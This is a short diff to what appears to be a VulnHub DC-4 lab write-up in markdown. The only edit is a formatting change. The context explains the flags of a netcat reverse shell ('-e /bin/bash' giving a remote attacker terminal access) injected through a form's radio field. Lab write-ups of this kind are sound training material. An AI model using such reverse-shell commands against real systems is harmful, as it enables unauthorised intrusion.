@@ -115,7 +115,7 @@ Then, inside the radio field, I executed the following payload:
 - \+ → Space.
 - -n → Listener IP address (my attacking machine).
 - -v → Verbose.
-- -e /bin/bash → Executes /bin/bash and grants the remote user terminal access.
+- -e /bin/bash → Executes `/bin/bash` and grants the remote user terminal access.
 
 ![Netcat in Target Machine](./img/vulnhub-dc4/Netcat-target.png)
 
